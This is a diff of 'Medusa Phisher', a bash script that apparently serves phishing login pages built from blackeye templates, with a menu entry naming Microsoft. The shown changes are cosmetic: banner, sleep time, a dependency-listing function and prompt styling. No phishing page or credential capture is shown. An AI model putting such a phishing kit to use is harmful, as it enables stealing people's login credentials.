@@ -1,11 +1,4 @@
 #!/bin/bash
-# Medusa Phisher
-# Author: Adrilaw
-# GitHub: github.com/Adrilaw
-
-
-
-#!/bin/bash
 
 # Define text colors
 RED='\033[0;31m'
@@ -26,7 +19,9 @@ big_welcome() {
     echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
     echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
     echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
+    return
 }
+
 
 
 # Clear the terminal
@@ -34,7 +29,15 @@ clear_terminal
 
 # Display the big welcome message
 big_welcome
-sleep 2
+
+# Pause for 3 seconds
+sleep 3
+
+
+
+# Medusa Phisher
+# Author: Adrilaw
+# GitHub: github.com/Adrilaw
 
 
 
@@ -45,6 +48,46 @@ open_page() {
     url="https://github.com/Adrilaw"
     open "$url"
 }
+
+# Function to get dependencies list
+get_dependencies_list() {
+    local dependencies=()
+
+    # Extract dependencies mentioned in the script
+    while IFS= read -r line; do
+        # Check for commands and extract dependencies
+        if [[ "$line" == *"xterm"* ]]; then
+            dependencies+=("xterm")
+        fi
+        if [[ "$line" == *"php"* ]]; then
+            dependencies+=("php")
+        fi
+        if [[ "$line" == *"ssh"* ]]; then
+            dependencies+=("ssh")
+        fi
+    done < "$0" # Read from the current script file
+
+    # Remove duplicates
+    dependencies=($(echo "${dependencies[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
+
+    # Print the list of dependencies
+    echo "${dependencies[@]}"
+}
+
+# Function to print a colored line
+print_colored_line() {
+    echo -e "\e[1;34m-------------------------------------------------------------------\e[0m"
+}
+
+# Call the function to get the dependencies list
+dependencies_list=$(get_dependencies_list)
+
+# Print the dependencies list with a colored line above
+print_colored_line
+echo -e "\e[1;33mDependencies list:\e[0m"
+echo "$dependencies_list"
+print_colored_line
+
 
 
 start_server() {
@@ -90,7 +133,8 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      
 # Add the coded by line
 printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"
 
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
+
 
 
 if [[ $option == 1 ]]; then
